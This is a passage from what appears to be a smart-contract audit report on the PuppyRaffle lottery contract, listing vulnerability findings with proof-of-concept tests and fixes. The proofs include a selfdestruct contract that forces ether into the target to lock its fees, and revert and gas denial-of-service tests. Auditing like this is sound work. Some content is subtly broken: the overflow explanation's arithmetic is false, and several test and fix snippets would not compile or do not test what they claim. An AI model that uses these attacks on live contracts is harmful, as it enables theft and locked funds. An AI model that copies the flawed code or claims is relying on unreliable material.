https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L153

https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L151C9-L151C61

## Summary

`PuppyRaffle::refund` is supposed to refund a player and remove him from the current players. But instead, it replaces his index value with address(0) which is considered a valid value by solidity. This can cause a lot issues because the players array length is unchanged and address(0) is now considered a player.

## Vulnerability Details

```javascript
players[playerIndex] = address(0);

@> uint256 totalAmountCollected = players.length * entranceFee;
(bool success,) = winner.call{value: prizePool}("");
require(success, "PuppyRaffle: Failed to send prize pool to winner");
_safeMint(winner, tokenId);
```

If a player refunds his position, the function `PuppyRaffle::selectWinner` will always revert. Because more than likely the following call will not work because the `prizePool` is based on a amount calculated by considering that that no player has refunded his position and exit the lottery. And it will try to send more tokens that what the contract has :

```javascript
uint256 totalAmountCollected = players.length * entranceFee;
uint256 prizePool = (totalAmountCollected * 80) / 100;

(bool success,) = winner.call{value: prizePool}("");
require(success, "PuppyRaffle: Failed to send prize pool to winner");
```

However, even if this calls passes for some reason (maby there are more native tokens that what the players have sent or because of the 80% ...). The call will thankfully still fail because of the following line is minting to the zero address is not allowed.

```javascript
_safeMint(winner, tokenId);
```

## Impact

The lottery is stoped, any call to the function `PuppyRaffle::selectWinner`will revert. There is no actual loss of funds for users as they can always refund and get their tokens back. However, the protocol is shut down and will lose all it's customers. A core functionality is exposed. Impact is high

### Proof of concept

To execute this test : forge test --mt testWinnerSelectionRevertsAfterExit -vvvv

```javascript
function testWinnerSelectionRevertsAfterExit() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        // There are four winners. Winner is last slot
        vm.prank(playerFour);
        puppyRaffle.refund(3);

        // reverts because out of Funds
        vm.expectRevert();
        puppyRaffle.selectWinner();

        vm.deal(address(puppyRaffle), 10 ether);
        vm.expectRevert("ERC721: mint to the zero address");
        puppyRaffle.selectWinner();

    }
```

## Tools Used

- foundry

## Recommendations

Delete the player index that has refunded.

```diff
-   players[playerIndex] = address(0);

+    players[playerIndex] = players[players.length - 1];
+    players.pop()
```

## <a id='H-05'></a>H-05. Typecasting from uint256 to uint64 in PuppyRaffle.selectWinner() May Lead to Overflow and Incorrect Fee Calculation

_Submitted by [0xethanol](https://profiles.cyfrin.io/u/undefined), [cem](https://profiles.cyfrin.io/u/undefined), [timenov](https://profiles.cyfrin.io/u/undefined), [ZedBlockchain](https://profiles.cyfrin.io/u/undefined), [zadev](https://profiles.cyfrin.io/u/undefined), [anarcheuz](https://profiles.cyfrin.io/u/undefined), [Y403L](https://profiles.cyfrin.io/u/undefined), [Dan](https://profiles.cyfrin.io/u/undefined), [asimaranov](https://profiles.cyfrin.io/u/undefined), [abhishekthakur](https://profiles.cyfrin.io/u/undefined), [irondevx](https://profiles.cyfrin.io/u/undefined), [kiteweb3](https://profiles.cyfrin.io/u/undefined), [charalab0ts](https://profiles.cyfrin.io/u/undefined), [aethrouzz](https://profiles.cyfrin.io/u/undefined), [syahirAmali](https://profiles.cyfrin.io/u/undefined), [bube](https://profiles.cyfrin.io/u/undefined), [0xscsamurai](https://profiles.cyfrin.io/u/undefined), [innertia](https://profiles.cyfrin.io/u/undefined), [sh0lt0](https://profiles.cyfrin.io/u/undefined), [00decree](https://profiles.cyfrin.io/u/undefined), [remedcu](https://profiles.cyfrin.io/u/undefined), [pratred](https://profiles.cyfrin.io/u/undefined), [0xlouistsai](https://profiles.cyfrin.io/u/undefined), [hueber](https://profiles.cyfrin.io/u/undefined), [ciaranightingale](https://profiles.cyfrin.io/u/undefined), [Chput](https://profiles.cyfrin.io/u/undefined). Selected submission by: [charalab0ts](https://profiles.cyfrin.io/u/undefined)._

### Relevant GitHub Links

https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L134

## Summary

## Vulnerability Details

The type conversion from uint256 to uint64 in the expression 'totalFees = totalFees + uint64(fee)' may potentially cause overflow problems if the 'fee' exceeds the maximum value that a uint64 can accommodate (2^64 - 1).

```javascript
totalFees = totalFees + uint64(fee);
```

## POC

<details>
<summary>Code</summary>

```javascript
function testOverflow() public {
        uint256 initialBalance = address(puppyRaffle).balance;

        // This value is greater than the maximum value a uint64 can hold
        uint256 fee = 2**64;

        // Send ether to the contract
        (bool success, ) = address(puppyRaffle).call{value: fee}("");
        assertTrue(success);

        uint256 finalBalance = address(puppyRaffle).balance;

        // Check if the contract's balance increased by the expected amount
        assertEq(finalBalance, initialBalance + fee);
    }
```

</details>

In this test, assertTrue(success) checks if the ether was successfully sent to the contract, and assertEq(finalBalance, initialBalance + fee) checks if the contract's balance increased by the expected amount. If the balance didn't increase as expected, it could indicate an overflow.

## Impact

This could consequently lead to inaccuracies in the computation of 'totalFees'.

## Tools Used

Manual

## Recommendations

To resolve this issue, you should change the data type of `totalFees` from `uint64` to `uint256`. This will prevent any potential overflow issues, as `uint256` can accommodate much larger numbers than `uint64`. Here's how you can do it:

Change the declaration of `totalFees` from:

```javascript
uint64 public totalFees = 0;
```

to:

```jasvascript
uint256 public totalFees = 0;
```

And update the line where `totalFees` is updated from:

```diff
- totalFees = totalFees + uint64(fee);
+ totalFees = totalFees + fee;

```

This way, you ensure that the data types are consistent and can handle the range of values that your contract may encounter.

## <a id='H-06'></a>H-06. Overflow/Underflow vulnerabilty for any version before 0.8.0

_Submitted by [0xbjorn](https://profiles.cyfrin.io/u/undefined), [timenov](https://profiles.cyfrin.io/u/undefined), [ZedBlockchain](https://profiles.cyfrin.io/u/undefined), [0xethanol](https://profiles.cyfrin.io/u/undefined), [nisedo](https://profiles.cyfrin.io/u/undefined), [tinotendajoe01](https://profiles.cyfrin.io/u/undefined), [inallhonesty](https://profiles.cyfrin.io/u/undefined), [n4thedev01](https://profiles.cyfrin.io/u/undefined), [Dan](https://profiles.cyfrin.io/u/undefined), [pacelli](https://profiles.cyfrin.io/u/undefined), [Chandr](https://profiles.cyfrin.io/u/undefined), [azmaeengh](https://profiles.cyfrin.io/u/undefined), [maanvad3r](https://profiles.cyfrin.io/u/undefined), [ryonen](https://profiles.cyfrin.io/u/undefined), [wallebach](https://profiles.cyfrin.io/u/undefined), [dentonylifer](https://profiles.cyfrin.io/u/undefined), [zuhaibmohd](https://profiles.cyfrin.io/u/undefined), [0xtekt](https://profiles.cyfrin.io/u/undefined), [syahirAmali](https://profiles.cyfrin.io/u/undefined), [stakog](https://profiles.cyfrin.io/u/undefined), [icebear](https://profiles.cyfrin.io/u/undefined), [Leogold](https://profiles.cyfrin.io/u/undefined), [bube](https://profiles.cyfrin.io/u/undefined), [blocktivist](https://profiles.cyfrin.io/u/undefined), [ezerez](https://profiles.cyfrin.io/u/undefined), [0xsagetony](https://profiles.cyfrin.io/u/undefined), [ironcladmerc](https://profiles.cyfrin.io/u/undefined), [EchoSpr](https://profiles.cyfrin.io/u/undefined), [emanherawy](https://profiles.cyfrin.io/u/undefined), [sh0lt0](https://profiles.cyfrin.io/u/undefined), [silvana](https://profiles.cyfrin.io/u/undefined), [Nocturnus](https://profiles.cyfrin.io/u/undefined), [00decree](https://profiles.cyfrin.io/u/undefined), [sobieski](https://profiles.cyfrin.io/u/undefined), [Dutch](https://profiles.cyfrin.io/u/undefined), [hueber](https://profiles.cyfrin.io/u/undefined), [harpaljadeja](https://profiles.cyfrin.io/u/undefined), [ciaranightingale](https://profiles.cyfrin.io/u/undefined), [davide](https://profiles.cyfrin.io/u/undefined), [Chput](https://profiles.cyfrin.io/u/undefined). Selected submission by: [azmaeengh](https://profiles.cyfrin.io/u/undefined)._

### Relevant GitHub Links

https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L80

https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L131C1-L134C45

## Summary

The PuppyRaffle.sol uses Solidity compiler version 0.7.6. Any Solidity version before 0.8.0 is prone to Overflow/Underflow vulnerability. Short example - a `uint8 x;` can hold 256 values (from 0 - 255). If the calculation results in `x` variable to get 260 as value, the extra part will overflow and we will end up with 5 as a result instead of the expected 260 (because 260-255 = 5).

## Vulnerability Details

I have two example below to demonstrate the problem of overflow and underflow with versions before 0.8.0, and how to fix it using safemath:

Without `SafeMath`:

```
function withoutSafeMath() external pure returns (uint256 fee){
    uint8 totalAmountCollected = 20;
    fee = (totalAmountCollected * 20) / 100;
    return fee;
}
// fee: 1
// WRONG!!!
```

In the above code,`without safeMath`, 20x20 (totalAmountCollected \* 20) was 400, but 400 is beyond the limit of uint8, so after going to 255, it went back to 0 and started counting from there. So, 400-255 = 145. 145 was the result of 20x20 in this code. And after dividing it by 100, we got 1.45, which the code showed as 1.

With `SafeMath`:

```
function withSafeMath() external pure returns (uint256 fee){
    uint8 totalAmountCollected = 20;
    fee =  totalAmountCollected.mul(20).div(100);
    return fee;
}
//  fee: 4
//  CORRECT!!!!
```

This code didnt suffer from Overflow problem. Because of the safeMath, it was able to calculate 20x20 as 400, and then divided it by 100, to get 4 as result.

## Impact

Depending on the bits assigned to a variable, and depending on whether the value assigned goes above or below a certain threshold, the code could end up giving unexpected results.
This unexpected OVERFLOW and UNDERFLOW will result in unexpected and wrong calculations, which in turn will result in wrong data being used and presented to the users.

## Tools Used

Got suggestions from AI tool phind. Tested the above code (with and without safeMath) on remix.ethereum.org

## Recommendations

Modify the code to include SafeMath:

1. First import SafeMath from openzeppelin:

```
import "@openzeppelin/contracts/math/SafeMath.sol";
```

2. then add the following line, inside PuppyRaffle Contract:

```
using SafeMath for uint256;
```

(can also add safemath for uint8, uint16, etc as per need)

3. Then modify the `require` inside `enterRaffle() function`:

```diff
- require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
+ uint256 totalEntranceFee = newPlayers.length.mul(entranceFee);
+ require(msg.value == totalEntranceFee, "PuppyRaffle: Must send enough to enter raffle");
```

3. Then modify variables (`totalAmountCollected`, `prizePool`, `fee`, and `totalFees`) inside `selectWinner()` function:

```diff
- uint256 totalAmountCollected = players.length * entranceFee;
+ uint256 totalAmountCollected = players.length.mul(entranceFee);

- uint256 prizePool = (totalAmountCollected * 80) / 100;
+ uint256 prizePool = totalAmountCollected.mul(80).div(100);

- uint256 fee = (totalAmountCollected * 20) / 100;
+ uint256 fee = totalAmountCollected.mul(20).div(100);

- totalFees = totalFees + uint64(fee);
+ totalFees = totalFees.add(fee);
```

This way, the code is now safe from Overflow/Underflow vulnerabilities.

## <a id='H-07'></a>H-07. Potential Front-Running Attack in `selectWinner` and `refund` Functions

_Submitted by [ZedBlockchain](https://profiles.cyfrin.io/u/undefined), [nisedo](https://profiles.cyfrin.io/u/undefined), [anarcheuz](https://profiles.cyfrin.io/u/undefined), [0xswahili](https://profiles.cyfrin.io/u/undefined), [emanherawy](https://profiles.cyfrin.io/u/undefined), [harpaljadeja](https://profiles.cyfrin.io/u/undefined), [ezerez](https://profiles.cyfrin.io/u/undefined). Selected submission by: [emanherawy](https://profiles.cyfrin.io/u/undefined)._

### Relevant GitHub Links

https://github.com/Cyfrin/2023-10-Puppy-Raffle/blame/e01ef1124677fb78249602a171b994e1f48a1298/src/PuppyRaffle.sol#L125

https://github.com/Cyfrin/2023-10-Puppy-Raffle/blame/e01ef1124677fb78249602a171b994e1f48a1298/src/PuppyRaffle.sol#L96

## Summary

Malicious actors can watch any `selectWinner` transaction and front-run it with a transaction that calls `refund` to avoid participating in the raffle if he/she is not the winner or even to steal the owner fess utilizing the current calculation of the `totalAmountCollected` variable in the `selectWinner` function.

## Vulnerability Details

The PuppyRaffle smart contract is vulnerable to potential front-running attacks in both the `selectWinner` and `refund` functions. Malicious actors can monitor transactions involving the `selectWinner` function and front-run them by submitting a transaction calling the `refund` function just before or after the `selectWinner` transaction. This malicious behavior can be leveraged to exploit the raffle in various ways. Specifically, attackers can:

1. **Attempt to Avoid Participation:** If the attacker is not the intended winner, they can call the `refund` function before the legitimate winner is selected. This refunds the attacker's entrance fee, allowing them to avoid participating in the raffle and effectively nullifying their loss.

2. **Steal Owner Fees:** Exploiting the current calculation of the `totalAmountCollected` variable in the `selectWinner` function, attackers can execute a front-running transaction, manipulating the prize pool to favor themselves. This can result in the attacker claiming more funds than intended, potentially stealing the owner's fees (`totalFees`).

## Impact

- **Medium:** The potential front-running attack might lead to undesirable outcomes, including avoiding participation in the raffle and stealing the owner's fees (`totalFees`). These actions can result in significant financial losses and unfair manipulation of the contract.

## Tools Used

- Manual review of the smart contract code.

## Recommendations

To mitigate the potential front-running attacks and enhance the security of the PuppyRaffle contract, consider the following recommendations:

- Implement Transaction ordering dependence (TOD) to prevent front-running attacks. This can be achieved by applying time locks in which participants can only call the `refund` function after a certain period of time has passed since the `selectWinner` function was called. This would prevent attackers from front-running the `selectWinner` function and calling the `refund` function before the legitimate winner is selected.

# Medium Risk Findings

## <a id='M-01'></a>M-01. `PuppyRaffle: enterRaffle` Use of gas extensive duplicate check leads to Denial of Service, making subsequent participants to spend much more gas than prev ones to enter

_Submitted by [philfr](https://profiles.cyfrin.io/u/undefined), [zadev](https://profiles.cyfrin.io/u/undefined), [inallhonesty](https://profiles.cyfrin.io/u/undefined), [shikhar229169](https://profiles.cyfrin.io/u/undefined), [funkornaut](https://profiles.cyfrin.io/u/undefined), [cem](https://profiles.cyfrin.io/u/undefined), [kiteweb3](https://profiles.cyfrin.io/u/undefined), [efecarranza](https://profiles.cyfrin.io/u/undefined), [ZedBlockchain](https://profiles.cyfrin.io/u/undefined), [0x6a70](https://profiles.cyfrin.io/u/undefined), [0xdark1337](https://profiles.cyfrin.io/u/undefined), [C0D30](https://profiles.cyfrin.io/u/undefined), [merlinboii](https://profiles.cyfrin.io/u/undefined), [ret2basic](https://profiles.cyfrin.io/u/undefined), [tinotendajoe01](https://profiles.cyfrin.io/u/undefined), [nisedo](https://profiles.cyfrin.io/u/undefined), [luka](https://profiles.cyfrin.io/u/undefined), [Eric](https://profiles.cyfrin.io/u/undefined), [alymurtazamemon](https://profiles.cyfrin.io/u/undefined), [charalab0ts](https://profiles.cyfrin.io/u/undefined), [securityFullCourse](https://profiles.cyfrin.io/u/undefined), [wallebach](https://profiles.cyfrin.io/u/undefined), [mahivasisth](https://profiles.cyfrin.io/u/undefined), [0xtheblackpanther](https://profiles.cyfrin.io/u/undefined), [danlipert](https://profiles.cyfrin.io/u/undefined), [Chandr](https://profiles.cyfrin.io/u/undefined), [abhishekthakur](https://profiles.cyfrin.io/u/undefined), [maanvad3r](https://profiles.cyfrin.io/u/undefined), [syahirAmali](https://profiles.cyfrin.io/u/undefined), [0xepley](https://codehawks.cyfrin.io/team/clkjtgvih0001jt088aqegxjj), [Kelvineth](https://profiles.cyfrin.io/u/undefined), [Osora9](https://profiles.cyfrin.io/u/undefined), [slasheur](https://profiles.cyfrin.io/u/undefined), [0xtekt](https://profiles.cyfrin.io/u/undefined), [0xanmol](https://profiles.cyfrin.io/u/undefined), [Marcologonz](https://profiles.cyfrin.io/u/undefined), [yeahchibyke](https://profiles.cyfrin.io/u/undefined), [0xspryon](https://profiles.cyfrin.io/u/undefined), [zhuying](https://profiles.cyfrin.io/u/undefined), [0xouooo](https://profiles.cyfrin.io/u/undefined), [zen4269](https://profiles.cyfrin.io/u/undefined), [zxarcs](https://profiles.cyfrin.io/u/undefined), [dougo](https://profiles.cyfrin.io/u/undefined), [bube](https://profiles.cyfrin.io/u/undefined), [happyformerlawyer](https://profiles.cyfrin.io/u/undefined), [0xKriLuv](https://profiles.cyfrin.io/u/undefined), [Damilare](https://profiles.cyfrin.io/u/undefined), [contractsecure](https://profiles.cyfrin.io/u/undefined), [dcheng](https://profiles.cyfrin.io/u/undefined), [0xsagetony](https://profiles.cyfrin.io/u/undefined), [EchoSpr](https://profiles.cyfrin.io/u/undefined), [Omeguhh](https://profiles.cyfrin.io/u/undefined), [MikeDougherty](https://profiles.cyfrin.io/u/undefined), [nervouspika](https://profiles.cyfrin.io/u/undefined), [pratred](https://profiles.cyfrin.io/u/undefined), [sh0lt0](https://profiles.cyfrin.io/u/undefined), [silvana](https://profiles.cyfrin.io/u/undefined), [hueber](https://profiles.cyfrin.io/u/undefined), [remedcu](https://profiles.cyfrin.io/u/undefined), [0xJimbo](https://profiles.cyfrin.io/u/undefined), [ciaranightingale](https://profiles.cyfrin.io/u/undefined), [engrpips](https://profiles.cyfrin.io/u/undefined), [harpaljadeja](https://profiles.cyfrin.io/u/undefined), [blocktivist](https://profiles.cyfrin.io/u/undefined), [cromewar](https://profiles.cyfrin.io/u/undefined), [musashi](https://profiles.cyfrin.io/u/undefined), [0xhashiman](https://profiles.cyfrin.io/u/undefined), [printfjoby](https://profiles.cyfrin.io/u/undefined), [0xjarix](https://profiles.cyfrin.io/u/undefined), [0x0bserver](https://profiles.cyfrin.io/u/undefined), [0xAxe](https://profiles.cyfrin.io/u/undefined). Selected submission by: [abhishekthakur](https://profiles.cyfrin.io/u/undefined)._

### Relevant GitHub Links

https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/main/src/PuppyRaffle.sol#79-92

## Summary

`enterRaffle` function uses gas inefficient duplicate check that causes leads to Denial of Service, making subsequent participants to spend much more gas than previous users to enter.

## Vulnerability Details

In the `enterRaffle` function, to check duplicates, it loops through the `players` array. As the `player` array grows, it will make more checks, which leads the later user to pay more gas than the earlier one. More users in the Raffle, more checks a user have to make leads to pay more gas.

## Impact

As the arrays grows significantly over time, it will make the function unusable due to block gas limit. This is not a fair approach and lead to bad user experience.

## POC

In existing test suit, add this test to see the difference b/w gas for users.
once added run `forge test --match-test testEnterRaffleIsGasInefficient -vvvvv` in terminal. you will be able to see logs in terminal.

```solidity
function testEnterRaffleIsGasInefficient() public {
  vm.startPrank(owner);
  vm.txGasPrice(1);

  /// First we enter 100 participants
  uint256 firstBatch = 100;
  address[] memory firstBatchPlayers = new address[](firstBatch);
  for(uint256 i = 0; i < firstBatchPlayers; i++) {
    firstBatch[i] = address(i);
  }

  uint256 gasStart = gasleft();
  puppyRaffle.enterRaffle{value: entranceFee * firstBatch}(firstBatchPlayers);
  uint256 gasEnd = gasleft();
  uint256 gasUsedForFirstBatch = (gasStart - gasEnd) * txPrice;
  console.log("Gas cost of the first 100 partipants is:", gasUsedForFirstBatch);

  /// Now we enter 100 more participants
  uint256 secondBatch = 200;
  address[] memory secondBatchPlayers = new address[](secondBatch);
  for(uint256 i = 100; i < secondBatchPlayers; i++) {
    secondBatch[i] = address(i);
  }

  gasStart = gasleft();
  puppyRaffle.enterRaffle{value: entranceFee * secondBatch}(secondBatchPlayers);
  gasEnd = gasleft();
  uint256 gasUsedForSecondBatch = (gasStart - gasEnd) * txPrice;
  console.log("Gas cost of the next 100 participant is:", gasUsedForSecondBatch);
  vm.stopPrank(owner);

}
```

## Tools Used

Manual Review, Foundry

## Recommendations

Here are some of recommendations, any one of that can be used to mitigate this risk.

1. User a mapping to check duplicates. For this approach you to declare a variable `uint256 raffleID`, that way each raffle will have unique id. Add a mapping from player address to raffle id to keep of users for particular round.

```diff
+ uint256 public raffleID;
+ mapping (address => uint256) public usersToRaffleId;
.
.
function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
+           usersToRaffleId[newPlayers[i]] = true;
        }

        // Check for duplicates
+       for (uint256 i = 0; i < newPlayers.length; i++){
+           require(usersToRaffleId[i] != raffleID, "PuppyRaffle: Already a participant");

-        for (uint256 i = 0; i < players.length - 1; i++) {
-            for (uint256 j = i + 1; j < players.length; j++) {
-                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-            }
        }

        emit RaffleEnter(newPlayers);
    }
.
.
.

function selectWinner() external {
        //Existing code
+    raffleID = raffleID + 1;
    }
```

2. Allow duplicates participants, As technically you can't stop people participants more than once. As players can use new address to enter.

```solidity
function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
        }

        emit RaffleEnter(newPlayers);
    }
```

## <a id='M-02'></a>M-02. Slightly increasing puppyraffle's contract balance will render `withdrawFees` function useless

_Submitted by [0xethanol](https://profiles.cyfrin.io/u/undefined), [whiteh4t9527](https://profiles.cyfrin.io/u/undefined), [zach030](https://profiles.cyfrin.io/u/undefined), [cem](https://profiles.cyfrin.io/u/undefined), [inallhonesty](https://profiles.cyfrin.io/u/undefined), [zac369](https://profiles.cyfrin.io/u/undefined), [ZedBlockchain](https://profiles.cyfrin.io/u/undefined), [darksnow](https://profiles.cyfrin.io/u/undefined), [shikhar229169](https://profiles.cyfrin.io/u/undefined), [0x6a70](https://profiles.cyfrin.io/u/undefined), [cosine](https://profiles.cyfrin.io/u/undefined), [merlinboii](https://profiles.cyfrin.io/u/undefined), [zadev](https://profiles.cyfrin.io/u/undefined), [eeshenggoh](https://profiles.cyfrin.io/u/undefined), [ret2basic](https://profiles.cyfrin.io/u/undefined), [ThermoHash](https://profiles.cyfrin.io/u/undefined), [nisedo](https://profiles.cyfrin.io/u/undefined), [alymurtazamemon](https://profiles.cyfrin.io/u/undefined), [anarcheuz](https://profiles.cyfrin.io/u/undefined), [Eric](https://profiles.cyfrin.io/u/undefined), [0xswahili](https://profiles.cyfrin.io/u/undefined), [charalab0ts](https://profiles.cyfrin.io/u/undefined), [0xSimeon](https://profiles.cyfrin.io/u/undefined), [n4thedev01](https://profiles.cyfrin.io/u/undefined), [luka](https://profiles.cyfrin.io/u/undefined), [rapstyle](https://profiles.cyfrin.io/u/undefined), [asimaranov](https://profiles.cyfrin.io/u/undefined), [priker](https://profiles.cyfrin.io/u/undefined), [abhishekthakur](https://profiles.cyfrin.io/u/undefined), [Chandr](https://profiles.cyfrin.io/u/undefined), [syahirAmali](https://profiles.cyfrin.io/u/undefined), [0xfuluz](https://profiles.cyfrin.io/u/undefined), [dentonylifer](https://profiles.cyfrin.io/u/undefined), [ryonen](https://profiles.cyfrin.io/u/undefined), [0xepley](https://codehawks.cyfrin.io/team/clkjtgvih0001jt088aqegxjj), [0x4non](https://profiles.cyfrin.io/u/undefined), [intellygentle](https://profiles.cyfrin.io/u/undefined), [ivanfitro](https://profiles.cyfrin.io/u/undefined), [davide](https://profiles.cyfrin.io/u/undefined), [DuncanDuMond](https://profiles.cyfrin.io/u/undefined), [0xtekt](https://profiles.cyfrin.io/u/undefined), [zuhaibmohd](https://profiles.cyfrin.io/u/undefined), [aethrouzz](https://profiles.cyfrin.io/u/undefined), [zhuying](https://profiles.cyfrin.io/u/undefined), [0xspryon](https://profiles.cyfrin.io/u/undefined), [krisrenzo](https://profiles.cyfrin.io/u/undefined), [Marcologonz](https://profiles.cyfrin.io/u/undefined), [0xouooo](https://profiles.cyfrin.io/u/undefined), [ro1sharkm](https://profiles.cyfrin.io/u/undefined), [maroutis](https://profiles.cyfrin.io/u/undefined), [zxarcs](https://profiles.cyfrin.io/u/undefined), [0xdangit](https://profiles.cyfrin.io/u/undefined), [bube](https://profiles.cyfrin.io/u/undefined), [ezerez](https://profiles.cyfrin.io/u/undefined), [n0kto](https://profiles.cyfrin.io/u/undefined), [kumar](https://profiles.cyfrin.io/u/undefined), [sm4rty](https://profiles.cyfrin.io/u/undefined), [happyformerlawyer](https://profiles.cyfrin.io/u/undefined), [blocktivist](https://profiles.cyfrin.io/u/undefined), [theinstructor](https://profiles.cyfrin.io/u/undefined), [dcheng](https://profiles.cyfrin.io/u/undefined), [0xsagetony](https://profiles.cyfrin.io/u/undefined), [0xscsamurai](https://profiles.cyfrin.io/u/undefined), [uint256vieet](https://profiles.cyfrin.io/u/undefined), [Omeguhh](https://profiles.cyfrin.io/u/undefined), [yeahchibyke](https://profiles.cyfrin.io/u/undefined), [innertia](https://profiles.cyfrin.io/u/undefined), [ironcladmerc](https://profiles.cyfrin.io/u/undefined), [Awacs](https://profiles.cyfrin.io/u/undefined), [y0ng0p3](https://profiles.cyfrin.io/u/undefined), [Nocturnus](https://profiles.cyfrin.io/u/undefined), [00decree](https://profiles.cyfrin.io/u/undefined), [0xabhayy](https://profiles.cyfrin.io/u/undefined), [equious](https://profiles.cyfrin.io/u/undefined), [remedcu](https://profiles.cyfrin.io/u/undefined), [kose](https://profiles.cyfrin.io/u/undefined), [silvana](https://profiles.cyfrin.io/u/undefined), [sobieski](https://profiles.cyfrin.io/u/undefined), [ciaranightingale](https://profiles.cyfrin.io/u/undefined), [harpaljadeja](https://profiles.cyfrin.io/u/undefined), [printfjoby](https://profiles.cyfrin.io/u/undefined), [hueber](https://profiles.cyfrin.io/u/undefined), [0xlouistsai](https://profiles.cyfrin.io/u/undefined), [slasheur](https://profiles.cyfrin.io/u/undefined). Selected submission by: [inallhonesty](https://profiles.cyfrin.io/u/undefined)._

### Relevant GitHub Links

https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L157-L163

## Summary

An attacker can slightly change the eth balance of the contract to break the `withdrawFees` function.

## Vulnerability Details

The withdraw function contains the following check:

```
require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
```

Using `address(this).balance` in this way invites attackers to modify said balance in order to make this check fail. This can be easily done as follows:

Add this contract above `PuppyRaffleTest`:

```
contract Kill {
    constructor  (address target) payable {
        address payable _target = payable(target);
        selfdestruct(_target);
    }
}
```

Modify `setUp` as follows:

```
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            duration
        );
        address mAlice = makeAddr("mAlice");
        vm.deal(mAlice, 1 ether);
        vm.startPrank(mAlice);
        Kill kill = new Kill{value: 0.01 ether}(address(puppyRaffle));
        vm.stopPrank();
    }
```

Now run `testWithdrawFees()` - ` forge test --mt testWithdrawFees` to get:

```
Running 1 test for test/PuppyRaffleTest.t.sol:PuppyRaffleTest
[FAIL. Reason: PuppyRaffle: There are currently players active!] testWithdrawFees() (gas: 361718)
Test result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 3.40ms
```

Any small amount sent over by a self destructing contract will make `withdrawFees` function unusable, leaving no other way of taking the fees out of the contract.

## Impact

All fees that weren't withdrawn and all future fees are stuck in the contract.

## Tools Used

Manual review

## Recommendations

Avoid using `address(this).balance` in this way as it can easily be changed by an attacker. Properly track the `totalFees` and withdraw it.

```diff
    function withdrawFees() external {
--      require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
        uint256 feesToWithdraw = totalFees;
        totalFees = 0;
        (bool success,) = feeAddress.call{value: feesToWithdraw}("");
        require(success, "PuppyRaffle: Failed to withdraw fees");
    }
```

## <a id='M-03'></a>M-03. Impossible to win raffle if the winner is a smart contract without a fallback function

_Submitted by [0xethanol](https://profiles.cyfrin.io/u/undefined), [ararara](https://profiles.cyfrin.io/u/undefined), [asimaranov](https://profiles.cyfrin.io/u/undefined), [priker](https://profiles.cyfrin.io/u/undefined), [Chandr](https://profiles.cyfrin.io/u/undefined), [0xVinylDavyl](https://profiles.cyfrin.io/u/undefined), [zhuying](https://profiles.cyfrin.io/u/undefined), [Marcologonz](https://profiles.cyfrin.io/u/undefined), [happyformerlawyer](https://profiles.cyfrin.io/u/undefined), [ciaranightingale](https://profiles.cyfrin.io/u/undefined). Selected submission by: [0xethanol](https://profiles.cyfrin.io/u/undefined)._

## Summary

If a player submits a smart contract as a player, and if it doesn't implement the `receive()` or `fallback()` function, the call use to send the funds to the winner will fail to execute, compromising the functionality of the protocol.

## Vulnerability Details

The vulnerability comes from the way that are programmed smart contracts, if the smart contract doesn't implement a `receive() payable` or `fallback() payable` functions, it is not possible to send ether to the program.

## Impact

High - Medium: The protocol won't be able to select a winner but players will be able to withdraw funds with the `refund()` function

## Recommendations

Restrict access to the raffle to only EOAs (Externally Owned Accounts), by checking if the passed address in enterRaffle is a smart contract, if it is we revert the transaction.

We can easily implement this check into the function because of the Adress library from OppenZeppelin.

I'll add this replace `enterRaffle()` with these lines of code:

```solidity

function enterRaffle(address[] memory newPlayers) public payable {
   require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
   for (uint256 i = 0; i < newPlayers.length; i++) {
      require(Address.isContract(newPlayers[i]) == false, "The players need to be EOAs");
      players.push(newPlayers[i]);
   }

   // Check for duplicates
   for (uint256 i = 0; i < players.length - 1; i++) {
       for (uint256 j = i + 1; j < players.length; j++) {
           require(players[i] != players[j], "PuppyRaffle: Duplicate player");
       }
   }

   emit RaffleEnter(newPlayers);
}
```

# Low Risk Findings

## <a id='L-01'></a>L-01. Ambiguous index returned from PuppyRaffle::getActivePlayerIndex(address), leading to possible refund failures

